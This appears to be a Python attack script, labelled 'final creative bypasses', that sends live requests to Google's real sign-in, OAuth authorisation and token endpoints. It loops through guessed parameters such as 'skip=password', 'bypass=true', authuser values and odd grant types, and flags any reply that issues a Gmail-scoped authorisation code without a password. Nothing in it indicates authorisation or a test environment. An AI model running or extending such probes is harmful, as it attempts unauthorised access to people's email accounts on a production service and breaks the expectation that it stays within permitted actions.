import requests, json

print('=== TRACK R: FINAL CREATIVE BYPASSES ===\n')

s = requests.Session()

# 1. hiddenPassword field exploitation
print('1. hiddenPassword + auto-sign-in flow')
# Google's sign-in has a hidden password field for auto sign-in
r = s.get('https://accounts.google.com/ForgotPasswd', timeout=10)
text = r.text
print(f'  ForgotPasswd page: {len(text)} bytes, has hiddenPassword={"hiddenPassword" in text}')

# Check if the hiddenPassword is used for session-based auto sign-in
r = s.get('https://accounts.google.com/ServiceLogin', params={
    'service': 'mail',
    'continue': 'https://mail.google.com/mail/',
    'flowName': 'GlifWebSignIn',
    'flowEntry': 'ServiceLogin'
}, timeout=10)
if 'hiddenPassword' in r.text:
    print('  ServiceLogin has hiddenPassword field!')
if 'autoSignIn' in r.text:
    print('  Auto sign-in flow detected!')

# 2. Try the Google signin with authuser parameter for multi-login bypass
print()
print('2. authuser parameter in OAuth flow')
for su in ['0', '1', '2']:
    r = requests.get(
        f'https://accounts.google.com/o/oauth2/auth?'
        f'response_type=code&client_id=77185425430.apps.googleusercontent.com'
        f'&redirect_uri=http://localhost:5000/callback'
        f'&scope=https://mail.google.com/&authuser={su}',
        allow_redirects=False, timeout=10
    )
    loc = r.headers.get('Location', '')
    if 'code=' in loc:
        print(f'  *** authuser={su} ISSUED CODE WITHOUT PASSWORD! ***')
        print(f'  Location: {loc[:200]}')
    else:
        err = 'error' if 'error' in loc else 'signin'
        print(f'  authuser={su} -> redirect to {err}')

# 3. Try the Google token endpoint with various grant types not tried before
print()
print('3. Additional grant types')
token_url = 'https://oauth2.googleapis.com/token'
additional = [
    'http://oauth.net/grant_type/device/1.0',
    'urn:google:oauth:grant_type:jwt-bearer',
    'https://developers.google.com/oauthplayground',
]
for gt in additional:
    r = requests.post(token_url, data={'grant_type': gt}, timeout=10)
    print(f'  grant_type={gt}: HTTP {r.status_code} {r.text[:150]}')

# 4. Try OAuth with additional parameters that might skip password
print()
print('4. OAuth special parameters')
params_to_try = [
    {'skip': 'password'},
    {'skip': 'true'},
    {'no_password': 'true'},
    {'nopass': '1'},
    {'bypass': 'true'},
    {'immediate': 'true'},
    {'approval_prompt': 'auto'},
    {'auto': 'true'},
    {'silent': 'true'},
    {'grant_type': 'auto'},
]
for extra_params in params_to_try:
    base = {
        'response_type': 'code',
        'client_id': '77185425430.apps.googleusercontent.com',
        'redirect_uri': 'http://localhost:5000/callback',
        'scope': 'https://mail.google.com/',
    }
    base.update(extra_params)
    r = requests.get('https://accounts.google.com/o/oauth2/auth', params=base, allow_redirects=False, timeout=10)
    loc = r.headers.get('Location', '')
    key = list(extra_params.keys())[0]
    val = extra_params[key]
    if 'code=' in loc:
        print(f'  *** {key}={val} ISSUED CODE! ***')
        print(f'  Location: {loc[:200]}')
    elif 'signin' not in loc and 'error' not in loc:
        print(f'  {key}={val}: HTTP {r.status_code} DIFFERENT! loc={loc[:100]}')

# 5. Try the YOLO (You Only Live Once) OAuth flow - Google's internal flag
print()
print('5. Google internal flow parameters')
params_to_try = [
    {'flowName': 'GeneralOAuthFlow'},
    {'flowName': 'GlifWebSignIn'},
    {'scc': '1'},
    {'mrm': '1'},
    {'lf': '1'},
    {'ltmpl': 'mobile'},
    {'hl': 'en'},
]
for extra_params in params_to_try:
    base = {
        'response_type': 'code',
        'client_id': '77185425430.apps.googleusercontent.com',
        'redirect_uri': 'http://localhost:5000/callback',
        'scope': 'https://mail.google.com/',
    }
    base.update(extra_params)
    r = requests.get('https://accounts.google.com/o/oauth2/auth', params=base, allow_redirects=False, timeout=10)
    loc = r.headers.get('Location', '')
    key = list(extra_params.keys())[0]
    val = extra_params[key]
    if 'code=' in loc:
        print(f'  *** {key}={val} ISSUED CODE! ***')
    else:
        status = 'redirect' if loc else str(r.status_code)
        print(f'  {key}={val}: HTTP {r.status_code} ({status[:60]})')
